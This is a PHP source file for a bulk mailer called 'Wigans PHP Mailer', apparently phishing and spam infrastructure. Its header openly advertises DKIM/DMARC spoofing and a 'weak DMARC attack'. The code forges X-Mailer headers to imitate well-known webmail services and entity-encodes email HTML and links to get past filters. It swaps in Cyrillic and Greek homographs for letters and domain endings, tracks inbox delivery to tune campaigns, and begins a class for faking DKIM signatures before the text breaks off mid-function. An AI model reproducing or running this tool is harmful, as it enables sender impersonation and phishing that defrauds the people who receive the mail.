<?php declare(strict_types=1);
// Wigans PHP Mailer with SMTP & Postfix Support
// Version: 3.2 - Enhanced with Improved DKIM/DMARC Spoofing, Weak DMARC Attack, Persistent Form Data, Limited Progress Display
// Initialize error logging
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);
ini_set('log_errors', '1');
ini_set('error_log', __DIR__ . '/php_errors.log');
// Fix session path mismatch
$custom_session_path = sys_get_temp_dir();
ini_set('session.save_handler', 'files');
ini_set('session.save_path', $custom_session_path);
ini_set('session.gc_probability', 1);
ini_set('session.gc_divisor', 1000);
ini_set('session.gc_maxlifetime', 1440);
// Start session for persistent form data
session_start();
if (!isset($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}
// Load persistent form data, merge with current POST if available for retention
$form_data = $_SESSION['form_data'] ?? [];
if (isset($_POST) && !empty($_POST)) {
    $form_data = array_merge($form_data, $_POST);
    $_SESSION['form_data'] = $form_data;
}
// Contact Management File
$contacts_file = __DIR__ . '/contacts.txt';
$sent_contacts_file = __DIR__ . '/sent_contacts.txt';
// Initialize contact files
if (!file_exists($contacts_file)) file_put_contents($contacts_file, '');
if (!file_exists($sent_contacts_file)) file_put_contents($sent_contacts_file, '');
// DMARC Cache File (to avoid repeated DNS queries)
$dmarc_cache_file = __DIR__ . '/dmarc_cache.json';
// Embedded PHPMailer Classes with SMTP Support
class PHPMailerException extends Exception {
    public function errorMessage(): string {
        return '<strong>' . htmlspecialchars($this->getMessage(), ENT_QUOTES, 'UTF-8') . "</strong><br>\n";
    }
}
class PHPMailer {
    public string $CharSet = 'UTF-8';
    public string $Encoding = 'base64';
    public string $ContentType = 'text/plain';
    public string $From = '';
    public string $FromName = '';
    public string $XMailer = '';
    public string $Subject = '';
    public string $Body = '';
    public string $AltBody = '';
    public array $to = [];
    public array $ReplyTo = [];
    public array $attachment = [];
    public array $embedded = [];
    public int $SMTPDebug = 0;
    public $Debugoutput = 'echo';
    public string $ErrorInfo = '';
    public string $Mailer = 'mail';
    public string $Host = '';
    public int $Port = 25;
    public bool $SMTPAuth = false;
    public string $Username = '';
    public string $Password = '';
    public string $SMTPSecure = '';
    public bool $SMTPKeepAlive = false;
    private $smtp_conn = false;
    private int $error_count = 0;
    private array $customHeaders = [];
    public function isSMTP(): void {
        $this->Mailer = 'smtp';
    }
    public function isSendmail(): void {
        $this->Mailer = 'sendmail';
    }
    public function isHTML(bool $isHtml): void {
        $this->ContentType = $isHtml ? 'text/html' : 'text/plain';
    }
    public function addAddress(string $address, string $name = ''): bool {
        $this->to[] = [$address, $name];
        return true;
    }
    public function addReplyTo(string $address, string $name = ''): bool {
        $this->ReplyTo[] = [$address, $name];
        return true;
    }
    public function addAttachment(string $path, string $name = ''): bool {
        if (!is_file($path) || !is_readable($path)) {
            $this->setError("File not found or unreadable: $path");
            return false;
        }
        $this->attachment[] = [$path, $name ?: basename($path)];
        return true;
    }
    public function addCustomHeader(string $name, string $value): void {
        $this->customHeaders[] = [$name, $value];
    }
    public function clearAddresses(): void {
        $this->to = [];
    }
    public function clearReplyTos(): void {
        $this->ReplyTo = [];
    }
    public function clearCustomHeaders(): void {
        $this->customHeaders = [];
    }
    public function clearAttachments(): void {
        $this->attachment = [];
    }
    public function secureHeader(string $str): string {
        return trim(str_replace(["\r", "\n"], '', $str));
    }
    public function setError(string $msg): void {
        $this->error_count++;
        $this->ErrorInfo = $msg;
    }
    // SMTP Connection Methods
    private function smtpConnect(): bool {
        try {
            $this->smtp_conn = fsockopen(
                $this->Host,
                $this->Port,
                $errno,
                $errstr,
                30
            );
        
            if (!$this->smtp_conn) {
                throw new PHPMailerException("SMTP connect failed: $errstr ($errno)");
            }
        
            // Read greeting
            $this->smtpGetResponse();
        
            // Send EHLO/HELO
            $this->smtpSend("EHLO " . $this->getHostname());
            $this->smtpGetResponse();
        
            // Start TLS if requested
            if ($this->SMTPSecure === 'tls') {
                $this->smtpSend("STARTTLS");
                $response = $this->smtpGetResponse();
                if (strpos($response, '220') !== 0) {
                    throw new PHPMailerException("STARTTLS failed: $response");
                }
                stream_socket_enable_crypto($this->smtp_conn, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                $this->smtpSend("EHLO " . $this->getHostname());
                $this->smtpGetResponse();
            }
        
            // Authenticate if required
            if ($this->SMTPAuth) {
                $this->smtpSend("AUTH LOGIN");
                $this->smtpGetResponse();
                $this->smtpSend(base64_encode($this->Username));
                $this->smtpGetResponse();
                $this->smtpSend(base64_encode($this->Password));
                $response = $this->smtpGetResponse();
                if (strpos($response, '235') !== 0) {
                    throw new PHPMailerException("SMTP authentication failed: $response");
                }
            }
        
            return true;
        } catch (Exception $e) {
            $this->setError($e->getMessage());
            return false;
        }
    }
    private function smtpSend(string $data): void {
        fwrite($this->smtp_conn, $data . "\r\n");
    }
    private function smtpGetResponse(): string {
        $response = '';
        while ($str = fgets($this->smtp_conn, 515)) {
            $response .= $str;
            if (substr($str, 3, 1) === ' ') break;
        }
        return $response;
    }
    private function getHostname(): string {
        return $_SERVER['SERVER_NAME'] ?? 'localhost';
    }
    public function smtpClose(): void {
        if ($this->smtp_conn) {
            $this->smtpSend("QUIT");
            $this->smtpGetResponse();
            fclose($this->smtp_conn);
            $this->smtp_conn = false;
        }
    }
    public function send(): bool {
        try {
            if ($this->Mailer === 'smtp') {
                return $this->smtpSendEmail();
            } else {
                return $this->sendmailSendEmail();
            }
        } catch (PHPMailerException $e) {
            $this->setError($e->getMessage());
            return false;
        }
    }
    private function smtpSendEmail(): bool {
        if (!$this->smtp_conn && !$this->smtpConnect()) {
            throw new PHPMailerException('SMTP connection failed');
        }
    
        // Set sender
        $this->smtpSend("MAIL FROM: <{$this->From}>");
        $response = $this->smtpGetResponse();
        if (strpos($response, '250') !== 0) {
            throw new PHPMailerException("MAIL FROM failed: $response");
        }
    
        // Set recipients
        foreach ($this->to as $recipient) {
            $this->smtpSend("RCPT TO: <{$recipient[0]}>");
            $response = $this->smtpGetResponse();
            if (strpos($response, '250') !== 0) {
                throw new PHPMailerException("RCPT TO failed for {$recipient[0]}: $response");
            }
        }
    
        // Send data
        $this->smtpSend("DATA");
        $response = $this->smtpGetResponse();
        if (strpos($response, '354') !== 0) {
            throw new PHPMailerException("DATA command failed: $response");
        }
    
        // Send headers and body
        $message = $this->createMessage();
        $this->smtpSend($message);
        $this->smtpSend(".");
    
        $response = $this->smtpGetResponse();
        if (strpos($response, '250') !== 0) {
            throw new PHPMailerException("Message sending failed: $response");
        }
    
        if (!$this->SMTPKeepAlive) {
            $this->smtpClose();
        }
    
        return true;
    }
    private function sendmailSendEmail(): bool {
        $message = $this->createMessage();
    
        // Use sendmail pipe
        $sendmail = popen("/usr/sbin/sendmail -t -i -f {$this->From} < " . escapeshellarg($this->tmpfile_as_string($message)), 'r');
        if ($sendmail === false) {
            throw new PHPMailerException('Failed to open sendmail');
        }
    
        $result = pclose($sendmail);
        if ($result !== 0) {
            throw new PHPMailerException('Sendmail failed with exit code: ' . $result);
        }
    
        return true;
    }
    private function createMessage(): string {
        $headers = [];
        $headers[] = 'MIME-Version: 1.0';
        $headers[] = "From: {$this->FromName} <{$this->From}>";
    
        if ($this->ReplyTo) {
            $headers[] = 'Reply-To: ' . ($this->ReplyTo[0][1] ? "{$this->ReplyTo[0][1]} <{$this->ReplyTo[0][0]}>" : $this->ReplyTo[0][0]);
        }
    
        if (!empty($this->XMailer)) {
            $headers[] = "X-Mailer: {$this->XMailer}";
        }
    
        // Add custom headers
        foreach ($this->customHeaders as $header) {
            $headers[] = "{$header[0]}: {$header[1]}";
        }
    
        $boundary = uniqid('boundary_');
        $isHTML = $this->ContentType === 'text/html';
        $body = '';
    
        $plainBody = $this->AltBody ?: strip_tags(str_replace(['<br>', '<br/>', '<br />'], "\n", $this->Body));
    
        if ($isHTML) {
            $this->Body = '<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>' . $this->Body . '</body></html>';
            $headers[] = "Content-Type: multipart/alternative; boundary=\"{$boundary}\"";
        
            $body .= "--{$boundary}\r\n";
            $body .= "Content-Type: text/plain; charset={$this->CharSet}\r\n";
            $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
            $body .= $plainBody . "\r\n";
        
            $body .= "--{$boundary}\r\n";
            $body .= "Content-Type: text/html; charset={$this->CharSet}\r\n";
            if ($this->Encoding !== '7bit') {
                $body .= "Content-Transfer-Encoding: {$this->Encoding}\r\n";
            }
            $body .= "\r\n" . $this->encodeString($this->Body, $this->Encoding) . "\r\n";
        } else {
            $headers[] = "Content-Type: {$this->ContentType}; charset={$this->CharSet}";
            if ($this->Encoding !== '7bit') {
                $headers[] = "Content-Transfer-Encoding: {$this->Encoding}";
            }
            $body = $this->encodeString($this->Body, $this->Encoding);
        }
    
        // Handle attachments
        foreach ($this->attachment as $attach) {
            $body .= "--{$boundary}\r\n";
            $body .= "Content-Type: application/octet-stream; name=\"{$attach[1]}\"\r\n";
            $body .= "Content-Transfer-Encoding: base64\r\n";
            $body .= "Content-Disposition: attachment; filename=\"{$attach[1]}\"\r\n";
            $body .= "\r\n" . chunk_split(base64_encode(file_get_contents($attach[0]))) . "\r\n";
        }
    
        if ($this->attachment || $isHTML) {
            $body .= "--{$boundary}--\r\n";
        }
    
        $to = implode(',', array_column($this->to, 0));
        $headers[] = "To: {$to}";
        $headers[] = "Subject: {$this->Subject}";
    
        return implode("\r\n", $headers) . "\r\n\r\n" . $body;
    }
    public function encodeString(string $str, string $encoding): string {
        $lower_encoding = strtolower($encoding);
        if ($lower_encoding === 'base64') {
            return chunk_split(base64_encode($str), 76, "\r\n");
        } elseif (in_array($lower_encoding, ['7bit', '8bit'])) {
            return $str . "\r\n";
        } elseif ($lower_encoding === 'quoted-printable') {
            return $this->encodeQP($str);
        } else {
            $this->setError("Unknown encoding: $encoding");
            return '';
        }
    }
    public function encodeQP(string $string): string {
        $string = str_replace(
            ['%20', '%0D%0A.', '%0D%0A', '%'],
            [' ', "\r\n=2E", "\r\n", '='],
            rawurlencode($string)
        );
        return preg_replace('/[^\r\n]{73}[^=\r\n]{2}/', "$0=\r\n", $string);
    }
    private function tmpfile_as_string(string $content): string {
        $tmp = tempnam(sys_get_temp_dir(), 'mail_');
        file_put_contents($tmp, $content);
        register_shutdown_function('unlink', $tmp);
        return $tmp;
    }
}
// X-Mailer Headers System
class XMailerSystem {
    private static $xmailers = [
        'Roundcube Webmail' => 'Roundcube Webmail',
        'SquirrelMail' => 'SquirrelMail',
        'Horde Groupware Webmail Edition' => 'Horde Groupware Webmail Edition',
        'Zimbra Web Client' => 'Zimbra Web Client',
        'OpenWebMail' => 'OpenWebMail',
        'AfterLogic WebMail Pro' => 'AfterLogic WebMail Pro',
        'MailEnable WebMail' => 'MailEnable WebMail',
        'Axigen WebMail' => 'Axigen WebMail',
        'IceWarp WebMail' => 'IceWarp WebMail',
        'RainLoop' => 'RainLoop',
        'Gmail Web Interface' => 'Gmail Web Interface',
        'Outlook Web App' => 'Outlook Web App',
        'Yahoo Mail Web' => 'Yahoo Mail Web',
        'AOL Webmail' => 'AOL Webmail',
        'iCloud Mail Web' => 'iCloud Mail Web',
        'ProtonMail Web' => 'ProtonMail Web',
        'Zoho Mail Web' => 'Zoho Mail Web',
        'GMX Webmail' => 'GMX Webmail',
        'Mail.com Webmail' => 'Mail.com Webmail',
        'Yandex Mail Web' => 'Yandex Mail Web',
        'IBM Notes Traveler' => 'IBM Notes Traveler',
        'Kerio Connect Webmail' => 'Kerio Connect Webmail',
        'Open-Xchange App Suite' => 'Open-Xchange App Suite',
        'Novell GroupWise WebAccess' => 'Novell GroupWise WebAccess',
        'MDaemon Webmail' => 'MDaemon Webmail',
        'Web.de Mail' => 'Web.de Mail',
        'Orange Webmail' => 'Orange Webmail',
        'Libero Mail Web' => 'Libero Mail Web',
        'SFR Webmail' => 'SFR Webmail',
        'Mail.ru Webmail' => 'Mail.ru Webmail',
        'Naver Mail' => 'Naver Mail',
        'QQ Mail Web' => 'QQ Mail Web',
        'Tutanota Web Client' => 'Tutanota Web Client',
        'Mailfence Webmail' => 'Mailfence Webmail',
        'StartMail Web Interface' => 'StartMail Web Interface',
        'Posteo Webmail' => 'Posteo Webmail',
        'Mailbox.org Webmail' => 'Mailbox.org Webmail',
        'FastMail Web UI' => 'FastMail Web UI',
        'Runbox Webmail' => 'Runbox Webmail',
        'Rackspace Webmail' => 'Rackspace Webmail',
        'Rackspace Email Web' => 'Rackspace Email Web',
        'Rackspace Cloud Office Webmail' => 'Rackspace Cloud Office Webmail',
        'Office 365 Web App' => 'Office 365 Web App',
        'Google Workspace Webmail' => 'Google Workspace Webmail',
        'Amazon WorkMail Web' => 'Amazon WorkMail Web',
        'Random' => 'Random'
    ];
    public static function getXMailers(): array {
        return self::$xmailers;
    }
    public static function getRandomXMailer(): string {
        $filtered = array_filter(self::$xmailers, fn($value) => $value !== 'Random');
        return $filtered[array_rand($filtered)];
    }
}
// Template Replacement System
class TemplateSystem {
    public static function applyReplacements(string $content, string $email, string $timezone): string {
        $replacements = self::generateReplacements($email, $timezone);
    
        foreach ($replacements as $placeholder => $replacement) {
            $content = str_replace($placeholder, $replacement, $content);
        }
    
        return $content;
    }
    private static function generateReplacements(string $email, string $timezone): array {
        $user = explode('@', $email)[0] ?? '';
        $domain = explode('@', $email)[1] ?? '';
        $domainPart = explode('.', $domain)[0] ?? '';
    
        return [
            '#XXXEMAIL#' => $email,
            '#DOMAIN#' => $domain,
            '#USER#' => $user,
            '#DOMC#' => ucfirst($domainPart),
            '#DOMs#' => $domainPart,
            '#BASE64EMAIL#' => base64_encode($email),
            '#MD5#' => md5(uniqid()),
            '#HOUR24#' => self::timezoneSet($timezone, 'fulltime24'),
            '#HOUR12#' => self::timezoneSet($timezone, 'fulltime12'),
            '#MINUTE#' => self::timezoneSet($timezone, 'i'),
            '#SECONDS#' => self::timezoneSet($timezone, 's'),
            '#DAY#' => self::timezoneSet($timezone, 'd'),
            '#MONTH#' => self::timezoneSet($timezone, 'm'),
            '#YEAR#' => self::timezoneSet($timezone, 'Y'),
            '#FULLDATE1#' => self::timezoneSet($timezone, 'full'),
            '#FULLDATE2#' => self::timezoneSet($timezone, 'full2'),
            '#1CHAR#' => self::randomstring_generate(1, 'alphanumeric'),
            '#2CHAR#' => self::randomstring_generate(2, 'alphanumeric'),
            '#3CHAR#' => self::randomstring_generate(3, 'alphanumeric'),
            '#4CHAR#' => self::randomstring_generate(4, 'alphanumeric'),
            '#5CHAR#' => self::randomstring_generate(5, 'alphanumeric'),
            '#6CHAR#' => self::randomstring_generate(6, 'alphanumeric'),
            '#7CHAR#' => self::randomstring_generate(7, 'alphanumeric'),
            '#8CHAR#' => self::randomstring_generate(8, 'alphanumeric'),
            '#9CHAR#' => self::randomstring_generate(9, 'alphanumeric'),
            '#10CHAR#' => self::randomstring_generate(10, 'alphanumeric'),
            '#20CHAR#' => self::randomstring_generate(20, 'alphanumeric'),
            '#1NUMBER#' => self::randomstring_generate(1, 'numeric'),
            '#2NUMBER#' => self::randomstring_generate(2, 'numeric'),
            '#3NUMBER#' => self::randomstring_generate(3, 'numeric'),
            '#4NUMBER#' => self::randomstring_generate(4, 'numeric'),
            '#5NUMBER#' => self::randomstring_generate(5, 'numeric'),
            '#6NUMBER#' => self::randomstring_generate(6, 'numeric'),
            '#7NUMBER#' => self::randomstring_generate(7, 'numeric'),
            '#8NUMBER#' => self::randomstring_generate(8, 'numeric'),
            '#9NUMBER#' => self::randomstring_generate(9, 'numeric'),
            '#10NUMBER#' => self::randomstring_generate(10, 'numeric'),
            '#20NUMBER#' => self::randomstring_generate(20, 'numeric'),
        ];
    }
    private static function timezoneSet(string $timezone, string $get): string {
        try {
            date_default_timezone_set($timezone);
        } catch (Exception $e) {
            date_default_timezone_set('UTC');
        }
    
        switch ($get) {
            case 'i': return date('i');
            case 's': return date('s');
            case 'd': return date('j');
            case 'm': return date('F');
            case 'Y': return date('Y');
            case 'full': return date('j F Y H:i:s');
            case 'full2': return date('j/n/Y H:i:s');
            case 'fulltime24': return date('H:i:s');
            case 'fulltime12': return date('h:i:s A');
            default: return date('Y-m-d H:i:s');
        }
    }
    private static function randomstring_generate(int $length, string $charset = 'alphanumeric'): string {
        switch ($charset) {
            case 'alphanumeric':
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                break;
            case 'numeric':
                $chars = '0123456789';
                break;
            default:
                $chars = '0123456789';
        }
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $result;
    }
}
// Obfuscation and Homograph Systems
class FinalObfuscator {
    private array $classMap = [];
    private array $idMap = [];
    private array $usedNames = [];
    private float $uniqueSeed;
    private string $obfuscationKey;
    public function __construct(string $key = '') {
        $this->uniqueSeed = microtime(true);
        $this->obfuscationKey = $key ?: bin2hex(random_bytes(16)); // Auto-generate dynamic key per instance
        srand(crc32($this->obfuscationKey)); // Seed randomness with key for dynamism
    }
    private function generateUniqueId(): string {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $length = rand(10, 17);
        do {
            $id = '';
            for ($i = 0; $i < $length; $i++) {
                $index = (int) floor(($this->uniqueSeed + lcg_value()) * strlen($chars)) % strlen($chars);
                $id .= $chars[$index];
            }
            $this->uniqueSeed += 0.1;
        } while (in_array($id, $this->usedNames, true));
        $this->usedNames[] = $id;
        return $id;
    }
    private function fullyEncodeText(string $text): string {
        $encoded = '';
        for ($i = 0; $i < mb_strlen($text, 'UTF-8'); $i++) {
            $char = mb_substr($text, $i, 1, 'UTF-8');
            $code = mb_ord($char, 'UTF-8');
            $rand = rand(0, 1);
            if ($rand === 0) {
                $format = '&#x' . dechex($code) . ';';
            } else {
                $format = '&#' . $code . ';';
            }
            $encoded .= $format;
        }
        return $encoded;
    }
    private function encodeURL(string $url): string {
        $encoded = '';
        for ($i = 0; $i < mb_strlen($url, 'UTF-8'); $i++) {
            $char = mb_substr($url, $i, 1, 'UTF-8');
            $code = mb_ord($char, 'UTF-8');
            $encoded .= '&#' . $code . ';';
        }
        return $encoded;
    }
    private function encodeEmojis(string $text): string {
        $emojiMap = [
            '📞' => '&#128222;',
            '📧' => '&#128231;',
            '🌐' => '&#127760;',
            '▼' => '&#9660;',
            '⚖' => '&#9878;'
        ];
        foreach ($emojiMap as $emoji => $entity) {
            $text = str_replace($emoji, $entity, $text);
        }
        return $text;
    }
    private function obfuscateCSS(string $cssContent): string {
        $cssContent = preg_replace_callback('/\.(-?[_a-zA-Z]+[_a-zA-Z0-9-]*)/', function ($match) {
            $className = $match[1];
            if (!isset($this->classMap[$className])) {
                $this->classMap[$className] = $this->generateUniqueId();
            }
            return '.' . $this->classMap[$className];
        }, $cssContent);
    
        $cssContent = preg_replace_callback('/#(-?[_a-zA-Z]+[_a-zA-Z0-9-]*)/', function ($match) {
            $idName = $match[1];
            if (!isset($this->idMap[$idName])) {
                $this->idMap[$idName] = $this->generateUniqueId();
            }
            return '#' . $this->idMap[$idName];
        }, $cssContent);
    
        return $cssContent;
    }
    private function addDynamicNoise(string $htmlContent): string {
        $noiseTemplates = [
            "<!-- " . $this->generateUniqueId() . " -->",
            "<!-- " . md5((string) lcg_value() . microtime(true)) . " -->",
            "<!-- " . base64_encode(date('c')) . " -->"
        ];
        $noiseCount = rand(3, 8);
        for ($i = 0; $i < $noiseCount; $i++) {
            $pos = strpos($htmlContent, '>', rand(0, strlen($htmlContent) - 1));
            if ($pos !== false) {
                $noise = $noiseTemplates[array_rand($noiseTemplates)];
                $htmlContent = substr_replace($htmlContent, "\n$noise\n", $pos + 1, 0);
            }
        }
        return $htmlContent;
    }
    public function processHTML(string $htmlContent, bool $isSvg = false, bool $isShtml = false): string {
        global $form_data;
        if (!($form_data['obfuscation_enabled'] ?? false)) {
            return $htmlContent;
        }
        $htmlContent = preg_replace_callback('/<style[^>]*>([\s\S]*?)<\/style>/i', function ($match) {
            return str_replace($match[1], $this->obfuscateCSS($match[1]), $match[0]);
        }, $htmlContent);
        $htmlContent = $this->encodeEmojis($htmlContent);
        $htmlContent = preg_replace_callback('/class="([^"]*)"/', function ($match) {
            $classList = $match[1];
            $classes = explode(' ', trim($classList));
            foreach ($classes as &$cls) {
                if (isset($this->classMap[$cls])) {
                    $cls = $this->classMap[$cls];
                }
            }
            return 'class="' . implode(' ', $classes) . '"';
        }, $htmlContent);
        $htmlContent = preg_replace_callback('/id="([^"]*)"/', function ($match) {
            $idValue = $match[1];
            if (isset($this->idMap[$idValue])) {
                return 'id="' . $this->idMap[$idValue] . '"';
            }
            return $match[0];
        }, $htmlContent);
        $htmlContent = preg_replace_callback('/href="([^"]*)"/', function ($match) {
            return 'href="' . $this->encodeURL($match[1]) . '"';
        }, $htmlContent);
        $htmlContent = preg_replace_callback('/<(\w+)([^>]*)>/', function ($match) use ($isSvg) {
            $tagName = $match[1];
            $attributes = $match[2];
            if (strtolower($tagName) === 'meta' && !$isSvg) return $match[0];
            $randomAttr = ' data-' . $this->generateUniqueId() . '="' . $this->generateUniqueId() . '"';
            return "<{$tagName}{$attributes}{$randomAttr}>";
        }, $htmlContent);
        $htmlContent = preg_replace_callback('/>([^<]+)</', function ($match) {
            $textContent = $match[1];
            if (trim($textContent) === '' || strpos($textContent, '#') !== false || preg_match('/\d+(px|%|em|rem|pt)/', $textContent)) {
                return $match[0];
            }
            return '>' . $this->fullyEncodeText($textContent) . '<';
        }, $htmlContent);
        $htmlContent = $this->addDynamicNoise($htmlContent);
        return $htmlContent;
    }
    public function processSVG(string $svgContent): string {
        return $this->processHTML($svgContent, true);
    }
    public function processSHTML(string $shtmlContent): string {
        return $this->processHTML($shtmlContent, false, true);
    }
    public function obfuscateTextContent(string $text): string {
        global $form_data;
        if (($form_data['homograph_enabled'] ?? false)) {
            $text = HomographSystem::encodeWithHomograph($text);
        }
        $randomPadding = $this->randomstring_generate(rand(5, 15), 'alphanumeric');
        $textWithPadding = $randomPadding . $text . $randomPadding;
        $encoded = $this->fullyEncodeText($textWithPadding);
        return str_replace($this->fullyEncodeText($randomPadding), '', $encoded);
    }
    private function randomstring_generate(int $length, string $charset = 'alphanumeric'): string {
        $chars = $charset === 'alphanumeric'
            ? 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            : '0123456789';
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $result;
    }
    public function getObfuscationKey(): string {
        return $this->obfuscationKey;
    }
}
class HomographSystem {
    const HOMOGRAPH_MAP = [
        'a' => ['а', 'ɑ', 'ą', 'ā'],
        'A' => ['А', 'Α', 'Ą', 'Ā'],
        'B' => ['В', 'Β', 'Ḇ', 'Ḅ'],
        'C' => ['С', 'Ϲ', 'Ć', 'Č'],
        'c' => ['с', 'ϲ', 'ć', 'č'],
        'e' => ['е', 'ę', 'ē', 'ě'],
        'E' => ['Е', 'Ε', 'Ę', 'Ē'],
        'H' => ['Н', 'Η', 'Ḧ', 'Ĥ'],
        'I' => ['І', 'Ι', 'Ī', 'Į'],
        'i' => ['і', 'ι', 'ī', 'į'],
        'J' => ['Ј', 'Ϳ', 'Ĵ', 'J'],
        'K' => ['К', 'Κ', 'Ķ', 'Ḳ'],
        'M' => ['М', 'Μ', 'Ṁ', 'Ḿ'],
        'N' => ['Ν', 'Ń', 'Ň', 'Ñ'],
        'O' => ['О', 'Ο', 'Ō', 'Ő'],
        'o' => ['о', 'ο', 'ō', 'ő'],
        'P' => ['Р', 'Ρ', 'Ṕ', 'Ṗ'],
        'p' => ['р', 'ρ', 'ṕ', 'ṗ'],
        'S' => ['Ѕ', 'Σ', 'Ś', 'Š'],
        'T' => ['Т', 'Τ', 'Ť', 'Ṫ'],
        'X' => ['Х', 'Χ', 'Ẋ', 'Ẍ'],
        'x' => ['х', 'χ', 'ẋ', 'ẍ'],
        'Y' => ['У', 'Υ', 'Ŷ', 'Ÿ'],
        'y' => ['у', 'υ', 'ŷ', 'ÿ']
    ];
    public static function encodeWithHomograph(string $text, bool $encodeAll = false): string {
        global $form_data;
        if (!($form_data['homograph_enabled'] ?? false) || (!$form_data['homograph_encodeAll'] ?? false) && !$encodeAll) {
            return $text;
        }
        $result = '';
        for ($i = 0; $i < mb_strlen($text, 'UTF-8'); $i++) {
            $char = mb_substr($text, $i, 1, 'UTF-8');
            if (isset(self::HOMOGRAPH_MAP[$char])) {
                $homographs = self::HOMOGRAPH_MAP[$char];
                $result .= $homographs[array_rand($homographs)];
            } else {
                $result .= $char;
            }
        }
        return $result;
    }
    public static function encodeTLDHomograph(string $url): string {
        global $form_data;
        if (!($form_data['homograph_enabled'] ?? false) || !($form_data['homograph_encodeTLD'] ?? false)) {
            return $url;
        }
        $tlds = ['com', 'net', 'org', 'edu', 'gov', 'info', 'biz', 'io', 'co', 'uk', 'us', 'ca', 'au', 'de', 'fr', 'jp', 'cn', 'ru', 'br', 'es', 'nl', 'se', 'no', 'fi', 'dk', 'pl', 'it', 'at', 'ch', 'be', 'gr', 'pt', 'hu', 'cz', 'sk', 'tr', 'ae', 'sa', 'za', 'in', 'mx', 'ar', 'cl', 'pe', 've', 'co', 'nz', 'sg', 'my', 'th', 'id', 'vn', 'ph', 'kr', 'tw', 'hk', 'il', 'eg', 'qa', 'om', 'kw', 'bh', 'jo', 'lb', 'cy', 'mt', 'lu', 'li', 'is', 'ie', 'ee', 'lv', 'lt', 'si', 'hr', 'ba', 'rs', 'mk', 'me', 'al'];
        $pattern = '/(\.)(' . implode('|', array_map('preg_quote', $tlds)) . ')(\/|$|\?|#)/i';
    
        return preg_replace_callback($pattern, function ($match) {
            $dot = $match[1];
            $tld = $match[2];
            $after = $match[3];
            $encodedTLD = self::encodeWithHomograph($tld, true);
            return $dot . $encodedTLD . $after;
        }, $url);
    }
}
// Contact Management System
class ContactManager {
    private $contacts_file;
    private $sent_contacts_file;
    public function __construct(string $contacts_file, string $sent_contacts_file) {
        $this->contacts_file = $contacts_file;
        $this->sent_contacts_file = $sent_contacts_file;
    }
    public function uploadContacts(string $content, bool $remove_sent = false): bool {
        $emails = array_filter(array_map('trim', explode("\n", $content)));
        $valid_emails = array_filter($emails, function($email) {
            return filter_var($email, FILTER_VALIDATE_EMAIL);
        });
        if ($remove_sent) {
            $sent = $this->getSentContacts();
            $valid_emails = array_diff($valid_emails, $sent);
        }
        return file_put_contents($this->contacts_file, implode("\n", $valid_emails)) !== false;
    }
    public function getContacts(): array {
        if (!file_exists($this->contacts_file)) return [];
        $content = file_get_contents($this->contacts_file);
        if ($content === false) {
            error_log("Failed to read contacts file: " . $this->contacts_file);
            return [];
        }
        return array_filter(array_map('trim', explode("\n", $content)));
    }
    public function getSentContacts(): array {
        if (!file_exists($this->sent_contacts_file)) return [];
        $content = file_get_contents($this->sent_contacts_file);
        if ($content === false) {
            error_log("Failed to read sent_contacts file: " . $this->sent_contacts_file);
            return [];
        }
        return array_filter(array_map('trim', explode("\n", $content)));
    }
    public function markAsSent(string $email): bool {
        return file_put_contents($this->sent_contacts_file, $email . "\n", FILE_APPEND | LOCK_EX) !== false;
    }
    public function getUnsentContacts(): array {
        $all_contacts = $this->getContacts();
        $sent_contacts = $this->getSentContacts();
        return array_diff($all_contacts, $sent_contacts);
    }
    public function clearSentContacts(): bool {
        return file_put_contents($this->sent_contacts_file, '') !== false;
    }
    public function clearAllContacts(): bool {
        $this->clearSentContacts();
        return file_put_contents($this->contacts_file, '') !== false;
    }
    public function getStats(): array {
        $all = $this->getContacts();
        $sent = $this->getSentContacts();
        $unsent = $this->getUnsentContacts();
        return [
            'total' => count($all),
            'sent' => count($sent),
            'unsent' => count($unsent)
        ];
    }
}
// Delivery Checker System
class DeliveryChecker {
    private $imap_host;
    private $imap_port;
    private $imap_username;
    private $imap_password;
    private $check_after;
    private $delivery_subject_marker;
    public function __construct(array $config) {
        $this->imap_host = $config['imap_host'] ?? '';
        $this->imap_port = $config['imap_port'] ?? 993;
        $this->imap_username = $config['imap_username'] ?? '';
        $this->imap_password = $config['imap_password'] ?? '';
        $this->check_after = $config['check_after'] ?? 10;
        $this->delivery_subject_marker = $config['delivery_subject_marker'] ?? 'DELIVERY_TEST_' . bin2hex(random_bytes(4));
    }
    public function checkDelivery(int $sent_count): bool {
        if ($sent_count < $this->check_after) {
            return true; // Continue sending
        }
        try {
            $mailbox = "{{$this->imap_host}:{$this->imap_port}/imap/ssl}INBOX";
            $imap = imap_open($mailbox, $this->imap_username, $this->imap_password);
        
            if (!$imap) {
                throw new Exception('IMAP connection failed: ' . imap_last_error());
            }
            // Search for emails with our marker from last 15 minutes
            $since = date('d-M-Y H:i:s', strtotime('-15 minutes'));
            $search = 'SUBJECT "' . $this->delivery_subject_marker . '" SINCE "' . $since . '"';
            $emails = imap_search($imap, $search);
            imap_close($imap);
            $delivered_count = $emails ? count($emails) : 0;
            $delivery_rate = ($delivered_count / $this->check_after) * 100;
            // If delivery rate is below 50%, stop sending
            return $delivery_rate >= 50;
        } catch (Exception $e) {
            // If IMAP check fails, continue sending but log error
            error_log("Delivery check failed: " . $e->getMessage());
            return true;
        }
    }
    public function getSubjectMarker(): string {
        return $this->delivery_subject_marker;
    }
}
// Enhanced Spoofing System (DKIM & DMARC)
class SpoofingSystem {
    public static function generateDKIMSignature(string $from_domain, bool $advanced = false): string {
        $selector = $advanced ? 'selector' . rand(1, 999) : 'default';
        $timestamp = time();
        $body_hash = base64_encode(hash('sha256', 'sample_body', true)); // Simulated body hash
